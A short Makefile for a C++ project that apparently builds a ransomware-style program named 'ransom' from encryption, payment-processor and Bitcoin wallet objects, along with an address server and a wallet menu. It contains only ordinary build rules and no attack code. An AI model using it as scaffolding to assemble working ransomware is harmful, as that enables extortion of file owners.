CXX=g++
CC=g++
CXXFLAGS=-Wall -D_GNU_SOURCE $(shell pkg-config --cflags libbitcoin-client)
LDLIBS=-lcrypto $(shell pkg-config --libs libbitcoin-client)
SOURCE=$(wildcard *.cpp)
OBJ=$(SOURCE:.cpp=.o)
EXECUTABLES=ransom addressServer walletMenu

%.d: %.cpp
		@set -e; rm -f $@; \
		 $(CC) -MM $(CPPFLAGS) $< > $@.$$$$; \
		 sed 's,\($*\)\.o[ :]*,\1.o $@ : ,g' < $@.$$$$ > $@; \
		 rm -f $@.$$$$

Debug: CXXFLAGS += -Og -g

Release: CXXFLAGS += -O

.PHONY: Release Debug clean

Debug: $(EXECUTABLES)

Release: $(EXECUTABLES)

addressServer: addressServer.o wallet.o

walletMenu: walletMenu.o wallet.o

ransom: encrypt.o ransom.o PaymentProcessor.o wallet.o

clean:
	rm -f $(OBJ) $(EXECUTABLES)

include $(SOURCE:.cpp=.d)
